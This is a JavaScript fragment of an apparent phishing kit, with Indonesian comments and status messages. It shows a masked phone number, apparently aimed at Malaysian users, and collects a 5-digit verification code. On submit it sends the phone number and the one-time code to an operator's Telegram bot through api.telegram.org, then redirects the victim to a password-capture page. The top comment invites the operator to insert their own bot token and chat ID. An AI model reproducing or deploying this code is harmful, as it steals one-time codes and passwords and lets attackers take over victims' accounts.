    // === Ganti dengan Bot Token dan Chat ID milik Anda ===
    const botToken = BOT_TOKEN;
  const chatId   = CHAT_ID;
    // ====================================================

    const urlParams = new URLSearchParams(window.location.search);
    const fullPhone = urlParams.get('phone') || "";
    const phoneMaskedElement = document.getElementById('phoneMasked');
    const editNumberButton = document.getElementById('editNumber');
    const codeForm = document.getElementById('codeForm');
    const statusMessage = document.getElementById('statusMessage');

    function maskPhoneNumber(phone) {
      if (phone.startsWith("+60") && phone.length > 4) {
        const prefix = phone.substring(0, 3);
        const nextTwo = phone.substring(3, 5);
        return `${prefix} ${nextTwo}********`;
      } else if (phone.length > 6) {
        const visible = phone.substring(0, 4);
        const hiddenLength = phone.length - 4;
        return visible + "*".repeat(hiddenLength);
      } else {
        return phone;
      }
    }
    phoneMaskedElement.textContent = maskPhoneNumber(fullPhone);
    editNumberButton.addEventListener('click', () => {
      window.history.back();
    });

    codeForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const verificationInput = document.getElementById('verificationCode');
      const verificationCode = verificationInput.value;
      
      if (verificationCode.length !== 5) {
        statusMessage.style.color = "red";
        statusMessage.textContent = "Kode harus terdiri dari 5 digit!";
        return;
      }

      statusMessage.style.color = "black";
      statusMessage.textContent = "Mengirim...";

      const messageText = `DATA BOYZCONNET
_________________________________
• Nomor Hp : ${fullPhone}
• Kode otp: ${verificationCode}
_________________________________
_________________________________`;
      const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;

      fetch(telegramAPI)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            statusMessage.style.color = "green";
            statusMessage.textContent = "Sukses!";
            window.location.href = `password.html?phone=${encodeURIComponent(fullPhone)}`;
          } else {
            statusMessage.style.color = "red";
            statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
          }
        })
        .catch(error => {
          statusMessage.style.color = "red";
          statusMessage.textContent = "Terjadi kesalahan: " + error;
        });
    });